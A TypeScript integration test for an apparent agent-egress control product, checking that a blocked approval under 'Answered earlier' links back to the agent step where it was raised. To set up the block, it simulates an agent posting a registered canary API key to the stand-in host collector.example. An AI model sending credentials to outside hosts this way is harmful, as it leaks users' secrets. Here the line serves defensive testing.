/**
 * answered-ask-link.test — an answer under Approvals › Answered earlier
 * links to the moment it was asked (dashboard.md §4.25h; §4.25 Approvals),
 * across the REAL components. Mandu-new.
 *
 * Until 2026-10-08 the answered row led nowhere: the waiting card's "See
 * what the agent was doing" went when it was answered, and an Allowed once
 * or a Block, which the Rules page lists only when standing, had no way back
 * to where the agent asked. `/api/home`'s answered row dropped the queue
 * row's sessions. This suite pins the whole path with no mocks:
 *
 *   A1  the net-proxy, wired as production wires it
 *       (`new ArbiterClientAdapter(new ArbiterClient(sock))`), stops a
 *       registered secret's send to a host no rule binds it to (`secrets`
 *       axes); the agent's 403 carries neither the value nor the queue id,
 *       and the stored `net_action` carries the id;
 *   A2  Block over the real route: `/api/home`'s answered row carries the
 *       session that raised it;
 *   A3  the served Approvals page (its own index.html and home.js in jsdom):
 *       the row's when line carries "See what the agent was doing" (then
 *       "Kept in Rules", a standing answer's link to Rules),
 *       addressed to `/agents/<session>?ask=<id>`; a click opens the served
 *       agent page with that step marked "Mandu asked you here", an EXACT
 *       match;
 *       The step says the answer: "Mandu asked for your OK in Approvals.
 *       Your answer: Blocked." (§4.25b; until 2026-10-08 only "asked");
 *   A3b "Allow instead" over the real route: the page's step now says
 *       "Always allowed", the row's answer as Answered earlier states it;
 *   A4  the oracle: neither `/api/home`, the agent page, the inspector's
 *       panel nor either rendered page carries the secret's value, and the
 *       product side carries no token.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer, type ApprovalsArbiter } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import type { AgentPageVM } from "../../dashboard/src/view-model/agent-page.js";
import type { HomeVM } from "../../dashboard/src/view-model/home.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { waitWhile } from "../../dashboard/test/unit/page-wait.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";

stateAxes("secrets");

const KEY_VALUE = "sk_live_answeredAskLinkStackCanary00000001";
const SESSION = "1791200000-733";
const CSRF = { "X-Mandu-Control": "1" };

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

test("an answer under Answered earlier links the session that asked, and the link opens the step where Mandu stopped (real arbiter, net-proxy, dashboard)", { timeout: 180_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-answered-link-"));
  const home = join(tmp, "home");
  mkdirSync(join(home, "proj"), { recursive: true });
  const socketPath = join(tmp, "arbiter.sock");
  const humanPath = humanSockIn(tmp);
  const arbiter = new ArbiterServer({
    socketPath, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanPath,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, // the `secrets` axes, stated
  });
  await arbiter.listen();

  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  const netHuman = new ArbiterClient(humanPath);
  const forwarded: string[] = [];
  const proxy = new NetProxy({
    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a stopped send must never be forwarded");
    },
    log: () => {},
  });
  const proxyPort = await proxy.listen(0);

  const gate = new ArbiterClient(socketPath); await gate.connect();
  const humanReader = new ArbiterClient(humanPath); await humanReader.connect();
  const admin = new ArbiterClient(join(tmp, "admin.sock")); await admin.connect();
  const approvalsArbiter: ApprovalsArbiter = {
    egressApprovals: (status) => admin.egressApprovals(status),
    resolveEgressApproval: (approvalId, approve, scope) => admin.resolveEgressApproval(approvalId, approve, scope),
  };
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath, humanSocketPath: humanPath }),
    approvalsArbiter,
    fileBrowserHome: home,
    configEnv: { MANDU_HOME: join(tmp, "mandu-home") },
    log: () => {},
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  try {
    // ── A1: a registered secret bound for a host no rule names is stopped ────
    const env = join(home, "proj", ".env");
    writeFileSync(env, `STRIPE_KEY=${KEY_VALUE}\n`);
    const reg = await gate.registerSecret({ path: env, sessionKey: SESSION });
    const keySym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.STRIPE_KEY/.exec(reg.twin ?? "")?.[0];
    assert.ok(keySym, `the key has its own symbol: ${JSON.stringify(reg)}`);
    const res = await viaProxy(proxyPort, "http://collector.example/upload", `k=${keySym}`);
    assert.equal(res.status, 403, `the send is stopped: ${res.body}`);
    assert.ok(!res.body.includes(KEY_VALUE), "the agent's answer carries no value");
    assert.equal(/egr-\d+/.test(res.body), false, "the agent's 403 body never carries the queue id");
    assert.deepEqual(forwarded, []);
    const pending = await admin.egressApprovals("pending");
    const row = pending.find((a) => a.symbol === keySym);
    assert.ok(row, `the stop queued a question: ${JSON.stringify(pending)}`);
    let stamped: string | undefined;
    for (let i = 0; i < 100 && !stamped; i++) {
      // Emission is best-effort and asynchronous.
      const events = (await humanReader.events(SESSION)) as unknown as { kind: string; action?: string; policy?: { approvalId?: string } }[];
      stamped = events.find((e) => e.kind === "net_action" && e.action === "blocked")?.policy?.approvalId;
      if (!stamped) await new Promise((r) => setTimeout(r, 20));
    }
    assert.equal(stamped, row!.id, "the stop's net_action carries the queue id");

    // ── A2: Block over the real route; the answered row keeps its session ────
    const deny = await pageFetch(`${base}/api/egress/approvals/${row!.id}/deny`, { method: "POST", headers: { ...CSRF, Cookie: dashboard.adminCookie() } });
    assert.equal(deny.status, 200);
    const vm = (await (await pageFetch(`${base}/api/home`)).json()) as HomeVM;
    assert.deepEqual(vm.waiting, [], "nothing waits any more");
    const answered = vm.answered.find((a) => a.id === row!.id);
    assert.ok(answered, "the answer is under Answered earlier");
    assert.equal(answered!.outcome, "blocked");
    assert.deepEqual(answered!.sessions, [SESSION], "the session that raised it");

    // ── A3: the served row links it; the link opens the step ─────────────────
    const rowSel = `#approvals-answered .row.answered[data-id="${row!.id}"]`;
    await servedProductPage(base, "/approvals", (doc) => doc.querySelector(`${rowSel} a.ask-link`) !== null, async (doc) => {
      const served = doc.querySelector(rowSel);
      assert.ok(served, "the served page lists the answer");
      const line = served.querySelector(".answered-what").lastElementChild;
      assert.equal(line.className, "dim answered-when", "the link is on the line under the words");
      assert.ok(line.querySelector("time"), "after when, as a <time>");
      // A standing answer (Blocked) ends with Kept in Rules (§4.25).
      assert.match(line.textContent, /\. See what the agent was doing\. Kept in Rules$/);
      const link = line.querySelector("a.ask-link");
      assert.equal(link.getAttribute("href"), `/agents/${SESSION}?ask=${row!.id}`, "the product's agent page at the ask");
      assert.equal(served.children[1].textContent, "Blocked");
      const approvals = doc.body.textContent ?? "";
      assert.ok(!approvals.includes(KEY_VALUE), "the Approvals page carries no secret value");
      assert.doesNotMatch(approvals, /\$MDU/, "nor a token");

      link.click();
      await waitWhile(() => doc.getElementById("page-agent").hidden || doc.querySelector("#agent-story .focus-note") === null);
      assert.equal(doc.getElementById("page-agent").hidden, false, "the agent page opened");
      const note = doc.querySelector("#agent-story .focus-note");
      assert.ok(note, "the page says it came from an answer");
      assert.equal(note.classList.contains("missing"), false, `the moment is found: "${note.textContent}"`);
      assert.equal(note.textContent, "You came here from an answer. The marked step is where Mandu stopped and asked you.", "an exact match, not the destination fallback");
      const tag = doc.querySelector("#agent-story .focus-tag");
      assert.ok(tag, "the step is marked");
      assert.equal(tag.textContent, "Mandu asked you here");
      const step = tag.closest("[data-step-id]");
      assert.ok(step && step.classList.contains("focus"), "on the marked step");
      assert.match(step.textContent, /collector\.example/, "the stopped send");
      const asked = step.querySelector(".note.asked");
      assert.ok(asked, "the step says Mandu asked");
      assert.equal(asked.textContent, "Mandu asked for your OK in Approvals. Your answer: Blocked.", "and the answer, in the words of Answered earlier");
      assert.equal(asked.querySelector("a").getAttribute("href"), `/approvals/${row!.id}`, "the word still opens the row");
      const agentPage = doc.body.textContent ?? "";
      assert.ok(!agentPage.includes(KEY_VALUE), "the agent page carries no secret value");
      assert.doesNotMatch(agentPage, /\$MDU/, "nor a token");
    });

    // The route the click asked: the exact step.
    const page = (await (await pageFetch(`${base}/api/home/agent?session=${SESSION}&ask=${encodeURIComponent(row!.id)}`)).json()) as AgentPageVM;
    assert.equal(page.focus?.ask, row!.id);
    assert.equal(page.focus?.match, "exact");
    const askedStep = (vm: AgentPageVM) => vm.story.flatMap((t) => t.steps).find((x) => x.kind === "action" && x.askId === row!.id);
    const stopped = askedStep(page);
    assert.ok(stopped && stopped.kind === "action", "the stopped send is a step that asked");
    assert.equal(stopped.answer, "blocked", "the route carries the row's answer");

    // ── A3b: Allow instead; the step says the new answer ─────────────────────
    const allow = await pageFetch(`${base}/api/egress/approvals/${row!.id}/approve`, { method: "POST", headers: { ...CSRF, Cookie: dashboard.adminCookie() } });
    assert.equal(allow.status, 200);
    const again = (await (await pageFetch(`${base}/api/home/agent?session=${SESSION}`)).json()) as AgentPageVM;
    const reversed = askedStep(again);
    assert.ok(reversed && reversed.kind === "action");
    assert.equal(reversed.answer, "allowed", "the answer it has now, as Answered earlier says it");
    const now = ((await (await pageFetch(`${base}/api/home`)).json()) as HomeVM).answered.find((a) => a.id === row!.id);
    assert.equal(now?.outcome, "allowed", "the same outcome Approvals shows");

    // ── A4: names and links, never values; no token on the product side ──────
    const bodies = {
      home: await (await pageFetch(`${base}/api/home`)).text(),
      agent: await (await pageFetch(`${base}/api/home/agent?session=${SESSION}&ask=${encodeURIComponent(row!.id)}`)).text(),
      panel: await (await pageFetch(`${base}/api/policy/panel`)).text(),
    };
    for (const [route, body] of Object.entries(bodies)) {
      assert.ok(!body.includes(KEY_VALUE), `${route} carries no secret value`);
    }
    assert.doesNotMatch(bodies.home, /\$MDU/, "the product's home carries no token");
    assert.doesNotMatch(bodies.agent, /\$MDU/, "nor its agent page");
  } finally {
    await dashboard.close();
    await proxy.close();
    netClient.close(); netHuman.close();
    gate.close(); humanReader.close(); admin.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
